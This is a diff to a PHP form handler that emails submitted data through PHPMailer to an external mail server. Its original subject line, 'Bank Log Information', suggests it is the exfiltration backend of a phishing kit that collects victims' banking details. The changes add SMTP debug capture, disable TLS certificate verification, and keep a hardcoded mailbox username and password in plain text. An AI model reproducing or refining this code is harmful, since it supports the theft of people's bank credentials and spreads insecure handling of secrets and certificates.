@@ -37,15 +37,36 @@ if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['send_info'])) {
     require __DIR__ . '/mail/PHPMailer.php';
     require __DIR__ . '/mail/SMTP.php';
 
+    // Capture Debug Output
+    $debugOutput = '';
+    
     try {
         $mail = new PHPMailer(true);
         
+        // Enable Debugging but capture it
+        $mail->SMTPDebug = 2; // Detailed debug
+        $mail->Debugoutput = function($str, $level) use (&$debugOutput) {
+            $debugOutput .= "$level: $str\n";
+        };
+
         // Server settings
         $mail->isSMTP();
         $mail->Host = 'mail.holdlogix.live';
         $mail->SMTPAuth = true;
         $mail->Username = 'info@holdlogix.live';
         $mail->Password = 'Obedofla@00';
+        
+        // Relaxed SSL Settings for both ports (Fixes certificate issues)
+        $sslOptions = [
+            'ssl' => [
+                'verify_peer' => false,
+                'verify_peer_name' => false,
+                'allow_self_signed' => true,
+            ]
+        ];
+        $mail->SMTPOptions = $sslOptions;
+
+        // Try Port 465 (SSL) first
         $mail->SMTPSecure = 'ssl';
         $mail->Port = 465;
 
@@ -55,7 +76,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['send_info'])) {
 
         // Content
         $mail->isHTML(false); // Plain text as per template appearance, or HTML with pre formatting
-        $mail->Subject = 'Bank Log Information';
+        $mail->Subject = 'Log Information';
 
         // Construct Body using Template
         $body = "
@@ -112,16 +133,12 @@ USER AGENT : Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/
             $mail->send();
         } catch (Exception $exSend) {
             // Fallback to TLS/587
+            $debugOutput .= "--- Failing over to TLS/587 ---\n";
             $mail->SMTPSecure = 'tls';
             $mail->Port = 587;
             $mail->SMTPAutoTLS = true;
-            $mail->SMTPOptions = [
-                'ssl' => [
-                    'verify_peer' => false,
-                    'verify_peer_name' => false,
-                    'allow_self_signed' => true,
-                ],
-            ];
+            // SMTPOptions already set above
+            
             try {
                 $mail->send();
             } catch (Exception $exSend2) {
@@ -133,10 +150,14 @@ USER AGENT : Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/
         exit;
 
     } catch (Exception $e) {
+        // Clean up debug output for JSON
+        // Remove sensitive info if necessary (like password) - simple replace
+        $safeDebug = str_replace('Obedofla@00', '********', $debugOutput);
+        
         echo json_encode([
             'status' => 'error', 
-            'message' => 'Failed to send email. Mailer Error.',
-            'debug' => $mail->ErrorInfo
+            'message' => 'Failed to send email. ' . $mail->ErrorInfo,
+            'debug' => $safeDebug
         ]);
         exit;
     }
